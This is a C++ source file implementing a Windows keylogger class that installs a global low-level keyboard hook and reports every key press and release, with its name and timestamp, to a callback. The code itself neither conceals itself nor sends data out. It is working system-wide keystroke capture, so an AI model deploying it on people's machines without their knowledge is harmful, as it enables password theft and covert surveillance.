#include "WindowsKeylogger.hpp"
#include <iostream>
#include <windows.h>
#include <algorithm> // For std::replace if needed
#include <chrono>

namespace platform {
namespace windows_os {

    // Global hook handle and instance pointer
    HHOOK g_hook = NULL;
    std::function<void(const interfaces::KeyEvent&)> g_callback;

    // Low-Level Keyboard Hook Callback
    LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
        if (nCode == HC_ACTION) {
            KBDLLHOOKSTRUCT* pKey = (KBDLLHOOKSTRUCT*)lParam;

            // WM_KEYDOWN or WM_SYSKEYDOWN
            bool is_down = (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN);
            bool is_up = (wParam == WM_KEYUP || wParam == WM_SYSKEYUP);

            if ((is_down || is_up) && g_callback) {
                interfaces::KeyEvent evt;
                evt.key_code = pKey->vkCode; // Correct field name
                evt.is_press = is_down;      // Correct field name
                evt.timestamp = GetTickCount64(); // Correct field name

                if (is_down) {
                    char keyName[64] = {0};
                    UINT mapScanCode = MapVirtualKey(pKey->vkCode, MAPVK_VK_TO_VSC);

                    LONG param = (mapScanCode << 16);
                    if (pKey->flags & LLKHF_EXTENDED) param |= (1 << 24);

                    if (GetKeyNameTextA(param, keyName, 64) > 0) {
                        evt.text = std::string(keyName);
                    } else {
                        evt.text = "CODE_" + std::to_string(pKey->vkCode);
                    }
                    g_callback(evt);
                }
            }
        }
        return CallNextHookEx(g_hook, nCode, wParam, lParam);
    }

    WindowsKeylogger::WindowsKeylogger() {}
    WindowsKeylogger::~WindowsKeylogger() { stop(); }

    common::Result<common::Ok> WindowsKeylogger::start(std::function<void(const interfaces::KeyEvent&)> callback) {
        if(running_) return common::Result<common::Ok>::success();

        g_callback = callback;
        running_ = true;

        thread_ = std::thread(&WindowsKeylogger::hook_thread, this);
        return common::Result<common::Ok>::success();
    }

    void WindowsKeylogger::stop() {
        if (!running_) return;

        auto start_time = std::chrono::high_resolution_clock::now();
        std::cout << "[WindowsKeylogger] stop() called" << std::endl;

        running_ = false;

        if (thread_id_ != 0) {
            std::cout << "[WindowsKeylogger] Sending WM_QUIT to thread " << thread_id_ << std::endl;
            PostThreadMessage(thread_id_, WM_QUIT, 0, 0);
        }

        if(thread_.joinable()) {
            std::cout << "[WindowsKeylogger] Waiting for thread to join..." << std::endl;
            thread_.join();
            auto join_time = std::chrono::high_resolution_clock::now();
            auto elapsed_ms = std::chrono::duration_cast<std::chrono::milliseconds>(join_time - start_time).count();
            std::cout << "[WindowsKeylogger] Thread joined after " << elapsed_ms << "ms" << std::endl;
        }

        g_callback = nullptr;
    }

    bool WindowsKeylogger::is_active() const { return running_; }

    void WindowsKeylogger::hook_thread() {
        thread_id_ = GetCurrentThreadId();
        g_hook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);

        if (!g_hook) {
            std::cerr << "[WindowsKeylogger] Failed to install hook! Error: " << GetLastError() << std::endl;
            running_ = false;
            return;
        }

        std::cout << "[WindowsKeylogger] Started" << std::endl;
        MSG msg;
        while (GetMessage(&msg, NULL, 0, 0) > 0) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }

        if (g_hook) {
            UnhookWindowsHookEx(g_hook);
            g_hook = NULL;
        }
        std::cout << "[WindowsKeylogger] Stopped" << std::endl;
    }

}
}
